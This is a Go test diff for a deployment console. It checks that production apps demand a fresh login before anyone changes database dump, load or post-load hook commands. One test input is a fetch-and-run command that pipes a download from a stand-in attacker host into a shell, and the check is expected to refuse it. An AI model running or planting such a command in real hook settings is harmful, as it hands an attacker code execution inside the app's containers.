@@ -118,6 +118,62 @@ func TestDangerousOperationsNeedRecentLogin(t *testing.T) {
 	}
 }
 
+// The dump hook, the load hook and the command after a load run inside the
+// app's containers, so changing one on a production app needs a recent login
+// like running a command there does.
+func TestProductionHookCommandsNeedRecentLogin(t *testing.T) {
+	srv, clk := newAuthServer(t, defaultGitHub())
+	b := newBrowser(t, srv.Handler())
+	b.login("code-owner")
+	origin := map[string]string{"Origin": consoleURL}
+	for _, slug := range []string{"blog", "shop"} {
+		create := b.do(http.MethodPost, "/api/apps",
+			`{"slug":"`+slug+`","web_port":3000,"repo_full_name":"octo/`+slug+`"}`, origin)
+		if create.Code != http.StatusCreated {
+			t.Fatalf("create: %d %s", create.Code, create.Body)
+		}
+	}
+	saved := `{"dump_hook_service":"db","dump_hook_command":"pg_dump -U postgres app"}`
+	if rec := b.do(http.MethodPatch, "/api/apps/shop", `{"environment":"production"}`, origin); rec.Code != http.StatusOK {
+		t.Fatalf("patch: %d %s", rec.Code, rec.Body)
+	}
+	if rec := b.do(http.MethodPatch, "/api/apps/shop", saved, origin); rec.Code != http.StatusOK {
+		t.Fatalf("hook within the window: %d %s", rec.Code, rec.Body)
+	}
+
+	clk.Advance(ReauthWindow)
+
+	for _, body := range []string{
+		`{"dump_hook_command":"sh -c 'curl https://attacker.example | sh'"}`,
+		`{"dump_hook_service":"web"}`,
+		`{"dump_hook_service":"","dump_hook_command":""}`,
+		`{"load_hook_service":"db","load_hook_command":"psql -U postgres app"}`,
+		`{"post_load_service":"web","post_load_command":"bin/rails runner Scrub.run"}`,
+	} {
+		rec := b.do(http.MethodPatch, "/api/apps/shop", body, origin)
+		if rec.Code != http.StatusForbidden || errorCode(t, rec) != "reauth_required" {
+			t.Errorf("PATCH production %s: %d %s", body, rec.Code, rec.Body)
+		}
+	}
+	app, err := srv.store.GetApp(t.Context(), "shop")
+	if err != nil || app.DumpHookCommand != "pg_dump -U postgres app" || app.LoadHookCommand != "" {
+		t.Errorf("a refused change must not be saved: %+v, %v", app, err)
+	}
+	// The settings screens send what they show: the saved values, with
+	// surrounding spaces or not, are no change.
+	for _, body := range []string{saved, `{"dump_hook_command":" pg_dump -U postgres app ","load_hook_service":"","backup_before_deploy":true}`} {
+		if rec := b.do(http.MethodPatch, "/api/apps/shop", body, origin); rec.Code != http.StatusOK {
+			t.Errorf("PATCH production with unchanged hooks %s: %d %s", body, rec.Code, rec.Body)
+		}
+	}
+	// Staging apps need no fresh login, as for one-off commands.
+	for _, body := range []string{saved, `{"load_hook_service":"db","load_hook_command":"psql -U postgres app"}`} {
+		if rec := b.do(http.MethodPatch, "/api/apps/blog", body, origin); rec.Code != http.StatusOK {
+			t.Errorf("PATCH staging %s: %d %s", body, rec.Code, rec.Body)
+		}
+	}
+}
+
 func TestReturnPathMustStayOnTheConsole(t *testing.T) {
 	for in, want := range map[string]string{
 		"":                       "/",
